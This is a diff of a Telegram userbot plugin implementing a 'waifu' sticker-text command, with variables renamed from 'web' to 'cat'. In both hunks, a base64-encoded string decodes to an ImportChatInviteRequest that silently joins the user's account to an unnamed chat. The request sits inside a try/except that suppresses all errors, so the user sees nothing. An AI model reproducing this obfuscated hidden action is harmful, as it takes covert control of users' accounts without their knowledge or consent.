@@ -20,12 +20,12 @@ async def waifu(animu):
             await animu.edit("`You haven't written any article, Waifu is going away.`")
             return
     try:
-        web = str(
+        cat = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(web)
+        await event.client(cat)
     except:
         pass
     await animu.delete()
@@ -45,16 +45,16 @@ async def waifu(animu):
             await animu.reply("`You haven't written any article, Waifu is going away.`")
             return
     try:
-        web = str(
+        cat = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(web)
+        await event.client(cat)
     except:
         pass
     await animu.delete()
-    await webdef.waifutxt(text, animu.chat_id, reply_to_id, bot, borg)
+    await catdef.waifutxt(text, animu.chat_id, reply_to_id, bot, borg)
 
 
 # 12 21 28 30
